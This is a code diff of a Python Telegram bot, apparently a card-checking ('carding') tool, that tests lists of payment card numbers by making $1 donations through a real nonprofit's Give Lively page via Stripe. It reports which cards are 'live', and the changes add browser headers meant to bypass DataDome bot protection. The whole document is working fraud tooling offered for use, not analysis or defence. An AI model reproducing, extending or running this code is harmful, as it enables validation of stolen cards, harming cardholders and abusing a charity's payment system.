@@ -19,10 +19,27 @@ MAX_CONCURRENT = 2       # တစ်ပြိုင်နက် စစ်ဆေ�
 DELAY_BETWEEN = (3, 6)   # Card တစ်ခုနဲ့တစ်ခုကြား delay (seconds)
 
 # ═══════════════════════════════════════════════════════
+#  BROWSER HEADERS (DataDome bypass အတွက် လိုအပ်)
+# ═══════════════════════════════════════════════════════
+PAGE_HEADERS = {
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'no-cache',
+    'pragma': 'no-cache',
+    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+}
+
+# ═══════════════════════════════════════════════════════
 #  HELPER
 # ═══════════════════════════════════════════════════════
 def extract_between(s, start, end):
-    """Extract text between two delimiters."""
     try:
         start_index = s.index(start) + len(start)
         end_index = s.index(end, start_index)
@@ -32,12 +49,9 @@ def extract_between(s, start, end):
 
 
 def extract_csrf(html):
-    """Extract CSRF token with multiple fallback patterns."""
-    # Primary method
     token = extract_between(html, 'name="csrf-token" content="', '"')
     if token:
         return token
-    # Fallback patterns
     patterns = [
         r'csrf-token["\s]*content="([^"]+)"',
         r'content="([^"]+)"[^>]*name="csrf-token"',
@@ -52,7 +66,6 @@ def extract_csrf(html):
 
 
 def extract_stripe_key(html):
-    """Extract Stripe publishable key from page, with hardcoded fallback."""
     m = re.search(r'pk_live_[A-Za-z0-9]+', html)
     if m:
         return m.group(0)
@@ -60,29 +73,15 @@ def extract_stripe_key(html):
 
 
 def extract_page_ids(html):
-    """Extract donation_page_context_id and nonprofit_id from page source."""
     ids = {}
-
-    # donation_page_context_id
     m = re.search(r'"donation_page_context_id"\s*:\s*"([a-f0-9-]{36})"', html)
-    if m:
-        ids['donation_page_context_id'] = m.group(1)
-    else:
-        ids['donation_page_context_id'] = 'd2ec45c5-4fae-4521-93cf-790c255a2c7c'
+    ids['donation_page_context_id'] = m.group(1) if m else 'd2ec45c5-4fae-4521-93cf-790c255a2c7c'
 
-    # donation_page_context_type
     m = re.search(r'"donation_page_context_type"\s*:\s*"([^"]+)"', html)
-    if m:
-        ids['donation_page_context_type'] = m.group(1)
-    else:
-        ids['donation_page_context_type'] = 'Campaign'
+    ids['donation_page_context_type'] = m.group(1) if m else 'Campaign'
 
-    # nonprofit_id
     m = re.search(r'"nonprofit_id"\s*:\s*"([a-f0-9-]{36})"', html)
-    if m:
-        ids['nonprofit_id'] = m.group(1)
-    else:
-        ids['nonprofit_id'] = '5d50ec0d-ceef-4dd8-acdc-d827f24b7429'
+    ids['nonprofit_id'] = m.group(1) if m else '5d50ec0d-ceef-4dd8-acdc-d827f24b7429'
 
     return ids
 
@@ -102,7 +101,6 @@ async def check_card(full, session):
 
         cc, mm, yyyy, cvv = [p.strip() for p in parts]
 
-        # Validate basic card info
         if not cc.isdigit() or len(cc) < 13:
             return "Invalid card number ❌"
         if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
@@ -125,10 +123,11 @@ async def check_card(full, session):
         full_name = f"{first_name} {last_name}"
         mail = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"
 
-        # ─── Step 1: Visit donation page ───
+        # ─── Step 1: Visit donation page (with full browser headers) ───
         try:
             r1 = await session.get(
                 'https://secure.givelively.org/donate/sertoma-inc/hearing-aid-project',
+                headers=PAGE_HEADERS,
                 timeout=30
             )
         except Exception as e:
@@ -144,7 +143,6 @@ async def check_card(full, session):
         if not csrf_token:
             return "CSRF token not found ⚠️"
 
-        # Dynamic extraction of IDs and Stripe key
         page_ids = extract_page_ids(r1.text)
         stripe_key = extract_stripe_key(r1.text)
 
@@ -152,6 +150,12 @@ async def check_card(full, session):
             'Content-Type': 'application/json',
             'Accept': 'application/json',
             'X-CSRF-Token': csrf_token,
+            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
         }
 
         # ─── Step 2: Create cart ───
@@ -195,17 +199,13 @@ async def check_card(full, session):
                 return "Captcha Block (cart) ⚠️"
             return f"Cart failed ({r2.status_code})"
 
-        # Extract cart ID with multiple fallbacks
         try:
             cart_resp = r2.json()
             cart_id = None
-            # Try: {"cart": {"id": "..."}}
             if 'cart' in cart_resp and isinstance(cart_resp['cart'], dict):
                 cart_id = cart_resp['cart'].get('id')
-            # Try: {"id": "..."}
             if not cart_id:
                 cart_id = cart_resp.get('id')
-            # Try: {"data": {"id": "..."}}
             if not cart_id and 'data' in cart_resp:
                 cart_id = cart_resp['data'].get('id')
         except (json.JSONDecodeError, AttributeError):
@@ -220,9 +220,6 @@ async def check_card(full, session):
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
-                          'AppleWebKit/537.36 (KHTML, like Gecko) '
-                          'Chrome/131.0.0.0 Safari/537.36',
         }
 
         stripe_payload = {
@@ -250,7 +247,7 @@ async def check_card(full, session):
         try:
             pm_data = r3.json()
         except json.JSONDecodeError:
-            return f"Stripe response parse error ⚠️"
+            return "Stripe response parse error ⚠️"
 
         if 'error' in pm_data:
             err = pm_data['error']
@@ -315,13 +312,11 @@ async def check_card(full, session):
         try:
             resp_json = r4.json()
 
-            # Success check
             if 'cart' in resp_json:
                 cart_info = resp_json['cart']
                 if cart_info.get('checked_out_at'):
                     return "Approved ✅ $1.00"
 
-            # 3DS / requires_action check
             if 'payment_intent' in resp_json:
                 pi = resp_json['payment_intent']
                 status = pi.get('status', '')
@@ -330,34 +325,31 @@ async def check_card(full, session):
                 elif status == 'succeeded':
                     return "Approved ✅ $1.00"
 
-            # Error messages
             if 'message' in resp_json:
                 msg = resp_json['message']
                 if isinstance(msg, list):
                     msg = ' '.join(msg)
-                # Classify common responses
                 msg_lower = msg.lower()
                 if 'insufficient' in msg_lower:
-                    return f"Insufficient Funds 💰 (CCN Live)"
+                    return "Insufficient Funds 💰 (CCN Live)"
                 elif 'stolen' in msg_lower or 'lost' in msg_lower:
-                    return f"Stolen/Lost Card ❌ {msg}"
+                    return f"Stolen/Lost Card ❌"
                 elif 'do not honor' in msg_lower:
-                    return f"Do Not Honor ❌"
+                    return "Do Not Honor ❌"
                 elif 'expired' in msg_lower:
-                    return f"Expired Card ❌"
+                    return "Expired Card ❌"
                 elif 'incorrect' in msg_lower and 'cvc' in msg_lower:
-                    return f"Incorrect CVC ❌ (CCN Live)"
+                    return "Incorrect CVC ❌ (CCN Live)"
                 elif 'security code' in msg_lower:
-                    return f"Security Code Error ❌ (CCN Live)"
+                    return "Security Code Error ❌ (CCN Live)"
                 elif 'restrict' in msg_lower:
-                    return f"Restricted Card ❌"
+                    return "Restricted Card ❌"
                 elif 'pickup' in msg_lower:
-                    return f"Pickup Card ❌"
+                    return "Pickup Card ❌"
                 elif 'try again' in msg_lower:
-                    return f"Try Again Later ⚠️"
+                    return "Try Again Later ⚠️"
                 return msg[:200]
 
-            # Fallback: check for error key
             if 'error' in resp_json:
                 return f"Error: {str(resp_json['error'])[:200]}"
 
@@ -423,7 +415,6 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def process_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle single card sent as text message."""
     text = update.message.text.strip()
 
     if "|" not in text:
@@ -469,7 +460,6 @@ async def process_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE
 
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle .txt file uploads."""
     document = update.message.document
 
     if not document.file_name.endswith('.txt'):
@@ -479,14 +469,16 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Download file
     file = await context.bot.get_file(document.file_id)
     file_bytes = await file.download_as_bytearray()
     content = file_bytes.decode('utf-8', errors='ignore')
     lines = [line.strip() for line in content.splitlines() if line.strip() and "|" in line]
 
     if not lines:
-        await update.message.reply_text("❌ ဖိုင်ထဲမှာ ကတ်မတွေ့ပါ\nFormat: <code>cc|mm|yyyy|cvv</code>", parse_mode='HTML')
+        await update.message.reply_text(
+            "❌ ဖိုင်ထဲမှာ ကတ်မတွေ့ပါ\nFormat: <code>cc|mm|yyyy|cvv</code>",
+            parse_mode='HTML'
+        )
         return
 
     total = len(lines)
@@ -501,11 +493,10 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='HTML'
     )
 
-    # Results tracking
     results = {
-        'live': [],      # Approved, 3DS, Insufficient
-        'dead': [],      # Declined
-        'error': [],     # Errors
+        'live': [],
+        'dead': [],
+        'error': [],
     }
     checked = 0
     start_time = time.time()
@@ -531,7 +522,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if is_live:
             results['live'].append((card_line, result))
-            # Send live hit notification immediately
             try:
                 await update.message.reply_text(
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -545,12 +535,11 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
             except Exception:
                 pass
-        elif "Declined" in result_str or "Expired" in result_str or "Stolen" in result_str or "Do Not Honor" in result_str:
+        elif any(kw in result_str for kw in ["Declined", "Expired", "Stolen", "Do Not Honor", "Restricted", "Pickup"]):
             results['dead'].append((card_line, result))
         else:
             results['error'].append((card_line, result))
 
-        # Update progress every 2 cards or at the end
         if current_checked % 2 == 0 or current_checked == total:
             elapsed = round(time.time() - start_time, 2)
             progress_bar = create_progress_bar(current_checked, total)
@@ -568,13 +557,11 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     parse_mode='HTML'
                 )
             except Exception:
-                pass  # Ignore Telegram edit rate limit
+                pass
 
-    # Run all cards with concurrency control
     tasks = [check_with_semaphore(line) for line in lines]
     await asyncio.gather(*tasks)
 
-    # Final summary
     total_time = round(time.time() - start_time, 2)
 
     summary = (
@@ -591,7 +578,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(summary, parse_mode='HTML')
 
-    # Send hits file if any
     if results['live']:
         hits_content = "\n".join(
             [f"{card} | {res}" for card, res in results['live']]
@@ -609,7 +595,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ═══════════════════════════════════════════════════════
 
 def mask_card(card_str):
-    """Mask card number for display: 4242****4242|12|2028|***"""
     try:
         parts = card_str.split("|")
         cc = parts[0].strip()
@@ -626,7 +611,7 @@ def get_status_emoji(result):
     result_str = str(result)
     if any(kw in result_str for kw in ["Approved", "Insufficient", "3DS", "CCN Live"]):
         return "✅"
-    elif "Declined" in result_str or "Expired" in result_str or "Do Not Honor" in result_str:
+    elif any(kw in result_str for kw in ["Declined", "Expired", "Do Not Honor"]):
         return "❌"
     else:
         return "⚠️"
@@ -640,7 +625,7 @@ def get_status_label(result):
         return "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘"
     elif "3DS" in result_str:
         return "𝟯𝗗𝗦 𝗟𝗜𝗩𝗘"
-    elif "Declined" in result_str or "Do Not Honor" in result_str:
+    elif any(kw in result_str for kw in ["Declined", "Do Not Honor"]):
         return "𝗗𝗘𝗔𝗗"
     else:
         return "𝗥𝗘𝗦𝗨𝗟𝗧"
@@ -659,20 +644,15 @@ def create_progress_bar(current, total, length=10):
 
 def main():
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("  💳 Stripe Checker Bot v2.0")
+    print("  💳 Stripe Checker Bot v3.0")
     print("  Starting...")
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
     app = Application.builder().token(BOT_TOKEN).build()
 
-    # Command handlers
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("help", help_command))
-
-    # File handler (for .txt uploads)
     app.add_handler(MessageHandler(filters.Document.ALL, process_file))
-
-    # Text handler (for single card messages)
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_single_card))
 
     print("  Bot is running!")
